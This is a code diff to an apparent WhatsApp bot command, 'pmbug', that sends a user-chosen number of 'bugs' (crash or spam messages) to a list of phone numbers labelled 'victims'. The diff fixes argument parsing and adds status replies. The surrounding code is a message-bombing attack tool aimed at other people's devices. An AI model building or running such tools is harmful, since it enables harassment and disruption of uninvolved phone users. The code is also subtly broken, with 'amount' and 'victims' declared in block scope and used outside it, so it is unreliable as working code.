@@ -228,23 +228,23 @@ zokou(
     if (!arg[0])
       return await repondre(`Use ${prefixe}pmbug amount\n> Example ${prefixe}pmbug 30|${conf.NUMERO_OWNER} or ${prefixe}pmbug ${conf.NUMERO_OWNER}`);
     await loading(dest, zk);
-    if (arg.length === 1){
+    if (!arg.join('').includes("|")){
       const amount = 30;
       const victims = [arg[0]];
-    } else if (arg.length > 1){
+    } else{
       const text = arg.join('');
       if (text.includes('|')){
       const amount = parseInt(text.split('|')[0].trim());
       if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
         return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
-      const victims = text.split('|').map(x => x.trim())[1].join('').split(',').map(x => x.trim());
+      const victims = text.split('|').map(x => x.trim())[1].split(',').map(x => x.trim());
       } else {
         return await repondre('invalid formart');
       }
       if (victims.length === 0)
         return await repondre('`No victims specified`');
     }
-    
+    await repondre(`sending ${amount} bugs to ${victims.join(', ')}`)
     for (let i = 0; i < victims.length; i++){
       const victim = victims[i]+'@s.whatsapp.net';
       for (let j = 0; j < amount; j++){
@@ -262,7 +262,7 @@ zokou(
       await repondre(`*Successfully sent as many Bugs as ${amount} To ${victim}*`);
       await delay(5000);
     }
-    await repondre(`*Successfully sent as many Bugs as ${amount} To ${victims.join(',')} Please pause for 5 minutes*`);
+    await repondre(`*Successfully sent as many Bugs as ${amount} To ${victims.join(', ')} Please pause for 5 minutes*`);
     await react(dest, zk, ms, '✅');
   }
   );
